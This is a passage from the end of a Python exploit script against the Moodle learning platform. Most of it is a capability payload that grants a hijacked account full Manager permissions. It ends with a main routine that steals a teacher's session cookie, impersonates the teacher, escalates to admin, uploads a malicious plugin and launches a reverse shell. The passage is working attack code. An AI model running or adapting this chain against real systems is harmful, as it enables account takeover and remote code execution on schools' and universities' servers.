            "moodle/question:usemine":1,
            "moodle/question:viewall":1,
            "moodle/question:viewmine":1,
            "moodle/rating:rate":1,
            "moodle/rating:view":1,
            "moodle/rating:viewall":1,
            "moodle/rating:viewany":1,
            "moodle/restore:configure":1,
            "moodle/restore:restoreactivity":1,
            "moodle/restore:restorecourse":1,
            "moodle/restore:restoresection":1,
            "moodle/restore:restoretargetimport":1,
            "moodle/restore:rolldates":1,
            "moodle/restore:uploadfile":1,
            "moodle/restore:userinfo":1,
            "moodle/restore:viewautomatedfilearea":1,
            "moodle/role:assign":1,
            "moodle/role:override":1,
            "moodle/role:review":1,
            "moodle/role:safeoverride":1,
            "moodle/role:switchroles":1,
            "moodle/site:viewreports":1,
            "moodle/user:loginas":1,
            "moodle/user:viewdetails":1,
            "moodle/user:viewhiddendetails":1,
            "report/completion:view":1,
            "report/log:view":1,
            "report/log:viewtoday":1,
            "report/loglive:view":1,
            "report/outline:view":1,
            "report/outline:viewuserreport":1,
            "report/participation:view":1,
            "report/progress:view":1,
            "report/stats:view":1,
            "repository/contentbank:accesscoursecontent":1,
            "tool/monitor:managerules":1,
            "tool/monitor:subscribe":1,
            "tool/recyclebin:deleteitems":1,
            "tool/recyclebin:restoreitems":1,
            "tool/recyclebin:viewitems":1,
            "webservice/rest:use":1,
            "webservice/soap:use":1,
            "webservice/xmlrpc:use":1,
            "atto/h5p:addembed":1,
            "atto/recordrtc:recordaudio":1,
            "atto/recordrtc:recordvideo":1,
            "booktool/exportimscp:export":1,
            "booktool/importhtml:import":1,
            "booktool/print:print":1,
            "forumreport/summary:view":1,
            "forumreport/summary:viewall":1,
            "mod/assign:editothersubmission":1,
            "mod/assign:exportownsubmission":1,
            "mod/assign:grade":1,
            "mod/assign:grantextension":1,
            "mod/assign:manageallocations":1,
            "mod/assign:managegrades":1,
            "mod/assign:manageoverrides":1,
            "mod/assign:receivegradernotifications":1,
            "mod/assign:releasegrades":1,
            "mod/assign:revealidentities":1,
            "mod/assign:reviewgrades":1,
            "mod/assign:showhiddengrader":1,
            "mod/assign:submit":1,
            "mod/assign:view":1,
            "mod/assign:viewblinddetails":1,
            "mod/assign:viewgrades":1,
            "mod/assignment:exportownsubmission":1,
            "mod/assignment:grade":1,
            "mod/assignment:submit":1,
            "mod/assignment:view":1,
            "mod/book:edit":1,
            "mod/book:read":1,
            "mod/book:viewhiddenchapters":1,
            "mod/chat:chat":1,
            "mod/chat:deletelog":1,
            "mod/chat:exportparticipatedsession":1,
            "mod/chat:exportsession":1,
            "mod/chat:readlog":1,
            "mod/chat:view":1,
            "mod/choice:choose":1,
            "mod/choice:deleteresponses":1,
            "mod/choice:downloadresponses":1,
            "mod/choice:readresponses":1,
            "mod/choice:view":1,
            "mod/data:approve":1,
            "mod/data:comment":1,
            "mod/data:exportallentries":1,
            "mod/data:exportentry":1,
            "mod/data:exportownentry":1,
            "mod/data:exportuserinfo":1,
            "mod/data:managecomments":1,
            "mod/data:manageentries":1,
            "mod/data:managetemplates":1,
            "mod/data:manageuserpresets":1,
            "mod/data:rate":1,
            "mod/data:view":1,
            "mod/data:viewallratings":1,
            "mod/data:viewalluserpresets":1,
            "mod/data:viewanyrating":1,
            "mod/data:viewentry":1,
            "mod/data:viewrating":1,
            "mod/data:writeentry":1,
            "mod/feedback:complete":1,
            "mod/feedback:createprivatetemplate":1,
            "mod/feedback:createpublictemplate":1,
            "mod/feedback:deletesubmissions":1,
            "mod/feedback:deletetemplate":1,
            "mod/feedback:edititems":1,
            "mod/feedback:mapcourse":1,
            "mod/feedback:receivemail":1,
            "mod/feedback:view":1,
            "mod/feedback:viewanalysepage":1,
            "mod/feedback:viewreports":1,
            "mod/folder:managefiles":1,
            "mod/folder:view":1,
            "mod/forum:addnews":1,
            "mod/forum:addquestion":1,
            "mod/forum:allowforcesubscribe":1,
            "mod/forum:canoverridecutoff":1,
            "mod/forum:canoverridediscussionlock":1,
            "mod/forum:canposttomygroups":1,
            "mod/forum:cantogglefavourite":1,
            "mod/forum:createattachment":1,
            "mod/forum:deleteanypost":1,
            "mod/forum:deleteownpost":1,
            "mod/forum:editanypost":1,
            "mod/forum:exportdiscussion":1,
            "mod/forum:exportforum":1,
            "mod/forum:exportownpost":1,
            "mod/forum:exportpost":1,
            "mod/forum:grade":1,
            "mod/forum:managesubscriptions":1,
            "mod/forum:movediscussions":1,
            "mod/forum:pindiscussions":1,
            "mod/forum:postprivatereply":1,
            "mod/forum:postwithoutthrottling":1,
            "mod/forum:rate":1,
            "mod/forum:readprivatereplies":1,
            "mod/forum:replynews":1,
            "mod/forum:replypost":1,
            "mod/forum:splitdiscussions":1,
            "mod/forum:startdiscussion":1,
            "mod/forum:viewallratings":1,
            "mod/forum:viewanyrating":1,
            "mod/forum:viewdiscussion":1,
            "mod/forum:viewhiddentimedposts":1,
            "mod/forum:viewqandawithoutposting":1,
            "mod/forum:viewrating":1,
            "mod/forum:viewsubscribers":1,
            "mod/glossary:approve":1,
            "mod/glossary:comment":1,
            "mod/glossary:export":1,
            "mod/glossary:exportentry":1,
            "mod/glossary:exportownentry":1,
            "mod/glossary:import":1,
            "mod/glossary:managecategories":1,
            "mod/glossary:managecomments":1,
            "mod/glossary:manageentries":1,
            "mod/glossary:rate":1,
            "mod/glossary:view":1,
            "mod/glossary:viewallratings":1,
            "mod/glossary:viewanyrating":1,
            "mod/glossary:viewrating":1,
            "mod/glossary:write":1,
            "mod/h5pactivity:reviewattempts":1,
            "mod/h5pactivity:submit":1,
            "mod/h5pactivity:view":1,
            "mod/imscp:view":1,
            "mod/label:view":1,
            "mod/lesson:edit":1,
            "mod/lesson:grade":1,
            "mod/lesson:manage":1,
            "mod/lesson:manageoverrides":1,
            "mod/lesson:view":1,
            "mod/lesson:viewreports":1,
            "mod/lti:admin":1,
            "mod/lti:manage":1,
            "mod/lti:view":1,
            "mod/page:view":1,
            "mod/quiz:attempt":1,
            "mod/quiz:deleteattempts":1,
            "mod/quiz:emailconfirmsubmission":1,
            "mod/quiz:emailnotifysubmission":1,
            "mod/quiz:emailwarnoverdue":1,
            "mod/quiz:grade":1,
            "mod/quiz:ignoretimelimits":1,
            "mod/quiz:manage":1,
            "mod/quiz:manageoverrides":1,
            "mod/quiz:preview":1,
            "mod/quiz:regrade":1,
            "mod/quiz:reviewmyattempts":1,
            "mod/quiz:view":1,
            "mod/quiz:viewreports":1,
            "mod/resource:view":1,
            "mod/scorm:deleteownresponses":1,
            "mod/scorm:deleteresponses":1,
            "mod/scorm:savetrack":1,
            "mod/scorm:skipview":1,
            "mod/scorm:viewreport":1,
            "mod/scorm:viewscores":1,
            "mod/survey:download":1,
            "mod/survey:participate":1,
            "mod/survey:readresponses":1,
            "mod/url:view":1,
            "mod/wiki:createpage":1,
            "mod/wiki:editcomment":1,
            "mod/wiki:editpage":1,
            "mod/wiki:managecomment":1,
            "mod/wiki:managefiles":1,
            "mod/wiki:managewiki":1,
            "mod/wiki:overridelock":1,
            "mod/wiki:viewcomment":1,
            "mod/wiki:viewpage":1,
            "mod/workshop:allocate":1,
            "mod/workshop:deletesubmissions":1,
            "mod/workshop:editdimensions":1,
            "mod/workshop:exportsubmissions":1,
            "mod/workshop:ignoredeadlines":1,
            "mod/workshop:manageexamples":1,
            "mod/workshop:overridegrades":1,
            "mod/workshop:peerassess":1,
            "mod/workshop:publishsubmissions":1,
            "mod/workshop:submit":1,
            "mod/workshop:switchphase":1,
            "mod/workshop:view":1,
            "mod/workshop:viewallassessments":1,
            "mod/workshop:viewallsubmissions":1,
            "mod/workshop:viewauthornames":1,
            "mod/workshop:viewauthorpublished":1,
            "mod/workshop:viewpublishedsubmissions":1,
            "mod/workshop:viewreviewernames":1,
            "moodle/backup:backupactivity":1,
            "moodle/competency:coursecompetencyconfigure":1,
            "moodle/course:activityvisibility":1,
            "moodle/course:ignoreavailabilityrestrictions":1,
            "moodle/course:manageactivities":1,
            "moodle/course:togglecompletion":1,
            "moodle/course:viewhiddenactivities":1,
            "moodle/h5p:deploy":1,
            "moodle/h5p:setdisplayoptions":1,
            "moodle/h5p:updatelibraries":1,
            "moodle/site:accessallgroups":1,
            "moodle/site:managecontextlocks":1,
            "moodle/site:trustcontent":1,
            "moodle/site:viewanonymousevents":1,
            "moodle/site:viewfullnames":1,
            "moodle/site:viewuseridentity":1,
            "quiz/grading:viewidnumber":1,
            "quiz/grading:viewstudentnames":1,
            "quiz/statistics:view":1,
            "quizaccess/seb:bypassseb":1,
            "quizaccess/seb:manage_filemanager_sebconfigfile":1,
            "quizaccess/seb:manage_seb_activateurlfiltering":1,
            "quizaccess/seb:manage_seb_allowedbrowserexamkeys":1,
            "quizaccess/seb:manage_seb_allowreloadinexam":1,
            "quizaccess/seb:manage_seb_allowspellchecking":1,
            "quizaccess/seb:manage_seb_allowuserquitseb":1,
            "quizaccess/seb:manage_seb_enableaudiocontrol":1,
            "quizaccess/seb:manage_seb_expressionsallowed":1,
            "quizaccess/seb:manage_seb_expressionsblocked":1,
            "quizaccess/seb:manage_seb_filterembeddedcontent":1,
            "quizaccess/seb:manage_seb_linkquitseb":1,
            "quizaccess/seb:manage_seb_muteonstartup":1,
            "quizaccess/seb:manage_seb_quitpassword":1,
            "quizaccess/seb:manage_seb_regexallowed":1,
            "quizaccess/seb:manage_seb_regexblocked":1,
            "quizaccess/seb:manage_seb_requiresafeexambrowser":1,
            "quizaccess/seb:manage_seb_showkeyboardlayout":1,
            "quizaccess/seb:manage_seb_showreloadbutton":1,
            "quizaccess/seb:manage_seb_showsebdownloadlink":1,
            "quizaccess/seb:manage_seb_showsebtaskbar":1,
            "quizaccess/seb:manage_seb_showtime":1,
            "quizaccess/seb:manage_seb_showwificontrol":1,
            "quizaccess/seb:manage_seb_templateid":1,
            "quizaccess/seb:manage_seb_userconfirmquit":1,
            "repository/areafiles:view":1,
            "repository/boxnet:view":1,
            "repository/contentbank:view":1,
            "repository/coursefiles:view":1,
            "repository/dropbox:view":1,
            "repository/equella:view":1,
            "repository/filesystem:view":1,
            "repository/flickr:view":1,
            "repository/flickr_public:view":1,
            "repository/googledocs:view":1,
            "repository/local:view":1,
            "repository/merlot:view":0,
            "repository/nextcloud:view":1,
            "repository/onedrive:view":1,
            "repository/picasa:view":1,
            "repository/recent:view":1,
            "repository/s3:view":1,
            "repository/skydrive:view":1,
            "repository/upload:view":1,
            "repository/url:view":1,
            "repository/user:view":1,
            "repository/webdav:view":1,
            "repository/wikimedia:view":1,
            "repository/youtube:view":1,
            "block/activity_modules:addinstance":1,
            "block/activity_results:addinstance":1,
            "block/admin_bookmarks:addinstance":1,
            "block/badges:addinstance":1,
            "block/blog_menu:addinstance":1,
            "block/blog_recent:addinstance":1,
            "block/blog_tags:addinstance":1,
            "block/calendar_month:addinstance":1,
            "block/calendar_upcoming:addinstance":1,
            "block/comments:addinstance":1,
            "block/completionstatus:addinstance":1,
            "block/course_list:addinstance":1,
            "block/course_summary:addinstance":1,
            "block/feedback:addinstance":1,
            "block/globalsearch:addinstance":1,
            "block/glossary_random:addinstance":1,
            "block/html:addinstance":1,
            "block/login:addinstance":1,
            "block/mentees:addinstance":1,
            "block/mnet_hosts:addinstance":1,
            "block/myprofile:addinstance":1,
            "block/navigation:addinstance":1,
            "block/news_items:addinstance":1,
            "block/online_users:addinstance":1,
            "block/online_users:viewlist":1,
            "block/private_files:addinstance":1,
            "block/quiz_results:addinstance":1,
            "block/recent_activity:addinstance":1,
            "block/rss_client:addinstance":1,
            "block/rss_client:manageanyfeeds":1,
            "block/rss_client:manageownfeeds":1,
            "block/search_forums:addinstance":1,
            "block/section_links:addinstance":1,
            "block/selfcompletion:addinstance":1,
            "block/settings:addinstance":1,
            "block/site_main_menu:addinstance":1,
            "block/social_activities:addinstance":1,
            "block/tag_flickr:addinstance":1,
            "block/tag_youtube:addinstance":1,
            "block/tags:addinstance":1,
            "moodle/block:edit":1,
            "moodle/block:view":1,
            "moodle/site:manageblocks":1,
            "savechanges":"Save changes"
        }
    res = stolenSession.post(definePermsURI, headers=headers, proxies=proxy, data=fullPermsPld)
    checkPluginPermsURI = "%sadmin/tool/installaddon/index.php" % url
    res = stolenSession.get(checkPluginPermsURI, headers=headers, proxies=proxy)
    if "Install plugin from ZIP file" in res.text:
        print(bdr,colr("Plugin Installer Permissions Granted!","green"))
    else:
        print(bdr,colr("No Plugin Installer Permissions Granted! :(","red"))
        exit(0)

# MAIN PROG
# # Register a moodle user account
register(username, password, email, fname)
listCourses()
# check in we need to enrole in a course or not
checkProfile()
gotTeacherSession = False
# retry if not a vaild teacher session callback
while not gotTeacherSession:
    # listen for get request from victim with cookie
    stealCookie()
    # imporsonate session of and check if a teacher
    hijackSession(teacherCookie)
    if gotTeacherSession:
        break
# upgrade account based on existing admin user via impersonation
elevateToAdmin()
# upgrade site management permissions
grantFullPerms()
# upload malicious plugin
buildEvilPlugin()
uploadEvilPlugin(pluginZip)
os.remove(pluginZip)
# execute reverse shell
runRevShell()

